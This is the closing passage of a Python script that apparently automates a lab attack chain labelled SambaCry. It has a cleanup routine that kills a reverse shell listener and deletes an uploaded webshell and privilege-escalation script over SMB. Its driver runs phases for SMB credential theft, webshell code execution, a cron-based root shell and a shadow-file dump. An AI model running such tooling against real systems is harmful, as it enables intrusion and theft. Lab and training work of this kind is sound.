        "  3. A root cron job executing files from a writable share enabled privilege escalation\n\n"
        "  [bold]No credentials were needed at any stage.[/bold]\n"
        "  [bold]No software vulnerability was exploited -- only misconfigurations.[/bold]\n"
        "  [bold]The entire attack chain used standard tools (smbclient, curl).[/bold]",
        title="[bold red]CVE-2017-7494 -- SambaCry Attack Primitive[/bold red]",
        border_style="bold red",
        padding=(1, 4),
    ))
    console.print()

# ---------------------------------------------------------------------------
#  Cleanup
# ---------------------------------------------------------------------------

def cleanup():
    info("Cleaning up local artifacts...")

    # Terminate listener process
    proc = STATE.get("listener_proc")
    if proc and proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
        ok("Reverse shell listener terminated")

    # Remove local temp files
    temp_files = ["/tmp/shell.php", "/tmp/privesc.run.sh", "/tmp/internal_credentials.txt"]
    for f in temp_files:
        if os.path.exists(f):
            os.remove(f)
            info(f"Removed {f}")

    # Remove webshell from victim if smbclient is available
    victim = STATE.get("victim_ip")
    if victim and shutil.which("smbclient"):
        info("Removing webshell from 'www' share...")
        rc, _, _ = run(
            ["smbclient", f"//{victim}/www", "-N", "-c", "del shell.php"],
            timeout=15,
        )
        if rc == 0:
            ok("Webshell removed from 'www' share")
        else:
            warn("Could not remove webshell -- remove manually")

        info("Removing privesc script from 'data' share...")
        rc, _, _ = run(
            ["smbclient", f"//{victim}/data", "-N", "-c", "del privesc.run.sh"],
            timeout=15,
        )
        if rc == 0:
            ok("Privesc script removed from 'data' share")
        else:
            warn("Could not remove privesc script -- remove manually")

    ok("Cleanup complete")

# ---------------------------------------------------------------------------
#  Main
# ---------------------------------------------------------------------------

def main():
    banner()
    configure()

    console.print(Panel(
        "  [cyan]Phase 1[/cyan]  Reconnaissance              (port scan, SMB enumeration)\n"
        "  [cyan]Phase 2[/cyan]  SMB Exfiltration             (share access, credential theft)\n"
        "  [cyan]Phase 3[/cyan]  Webshell Upload & RCE        (SMB write -> HTTP execute)\n"
        "  [cyan]Phase 4[/cyan]  Privilege Escalation         (cron-based root shell)\n"
        "  [cyan]Phase 5[/cyan]  Post-Exploitation            (root enum, shadow, flag)\n"
        "  [cyan]Phase 6[/cyan]  Report & ATT&CK Mapping",
        title="[bold]Attack Chain Overview[/bold]",
        border_style="blue",
    ))
    console.print()

    phases = [
        ("Reconnaissance",              phase_recon),
        ("SMB Exfiltration",            phase_smb_exfil),
        ("Webshell Upload & RCE",       phase_webshell),
        ("Privilege Escalation",        phase_privesc),
        ("Post-Exploitation",           phase_post_exploit),
        ("Report",                      phase_report),
    ]

    try:
        for i, (name, func) in enumerate(phases, 1):
            try:
                func()
                if i < len(phases):
                    if not Confirm.ask(
                        f"\n  [bold cyan]Phase {i} ({name}) complete. Continue to Phase {i+1}?[/bold cyan]",
                        default=True,
                    ):
                        info("Skipping remaining phases, jumping to report...")
                        phase_report()
                        break
            except KeyboardInterrupt:
                console.print(f"\n[yellow]Phase {i} ({name}) interrupted.[/yellow]")
                if not Confirm.ask("  Continue to next phase?", default=True):
                    break
            except Exception as exc:
                err(f"Phase {i} ({name}): {exc}")
                console.print_exception(show_locals=False)
                if not Confirm.ask("  Continue despite error?", default=True):
                    break
    finally:
        console.print()
        if Confirm.ask("  [bold]Clean up artifacts (remove webshell, privesc script, temp files)?[/bold]",
                       default=True):
            cleanup()
        else:
            info("Artifacts left in place -- clean up manually when done")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]Aborted.[/red]")
        cleanup()
        sys.exit(1)
